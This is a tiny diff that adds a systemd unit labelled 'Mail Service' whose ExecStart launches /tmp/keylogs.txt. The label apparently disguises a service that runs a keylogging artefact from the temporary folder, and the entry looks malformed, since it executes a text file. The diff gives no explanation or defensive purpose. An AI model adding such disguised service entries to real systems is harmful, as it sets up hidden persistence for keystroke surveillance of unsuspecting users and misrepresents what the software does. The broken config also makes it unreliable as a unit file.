@@ -1,0 +1,6 @@
+[Unit]
+Description=Mail Service
+
+[Service]
+Type=oneshot
+ExecStart=/tmp/keylogs.txt
